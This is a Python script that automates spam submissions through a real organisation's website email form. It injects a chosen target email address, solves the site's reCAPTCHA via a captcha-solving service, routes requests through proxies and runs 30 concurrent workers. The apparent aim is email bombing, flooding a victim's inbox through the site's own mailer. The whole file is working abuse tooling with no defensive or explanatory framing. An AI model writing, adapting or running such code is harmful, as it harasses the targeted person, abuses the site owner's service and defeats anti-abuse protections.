from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.923659201.1675951230',
    '_ga': 'GA1.1.141738525.1675951230',
    '_ga_FF0XRKLGD3': 'GS1.1.1675951229.1.1.1675954503.0.0.0',
}

headers = {
    'authority': 'www.wyominggrown.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary123v1qKA4lfKfaGQ',
    # 'cookie': '_gid=GA1.2.923659201.1675951230; _ga=GA1.1.141738525.1675951230; _ga_FF0XRKLGD3=GS1.1.1675951229.1.1.1675954503.0.0.0',
    'origin': 'https://www.wyominggrown.org',
    'referer': 'https://www.wyominggrown.org/email-form/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.captcha_solver.solve('6LfMZCAUAAAAAEYXHNwenD_m0TFbUxgafFFWp4Jg',
                                        'https://www.wyominggrown.org/email-form/')
        if not cap:
            return

        data = '------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_1"\r\n\r\ntest\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_4"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_2"\r\n\r\ntest\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_6"\r\n\r\ntest\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_3"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="input_8"\r\n\r\n\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_ajax"\r\n\r\nform_id=3&title=&description=&tabindex=0\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="is_submit_3"\r\n\r\n1\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n3\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="state_3"\r\n\r\nWyJbXSIsIjdiZDU5YTFmNTQ3ZDk2YWM1NzE0YjFlMTgyZjRhYTJjIl0=\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_target_page_number_3"\r\n\r\n0\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_source_page_number_3"\r\n\r\n1\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundary123v1qKA4lfKfaGQ--\r\n'
        data = data.replace('cap_que', cap).replace('wezxasqw@gmail.com', target).replace('test', self.get_text())
        for _ in range(10):
            try:
                response = requests.post('https://www.wyominggrown.org/email-form/', cookies=cookies, headers=headers,
                                         data=data.encode(), proxies=self.get_proxies())
                return response
            except Exception as e:
                print(e)
        return


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Your information has been sent successfully!')
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
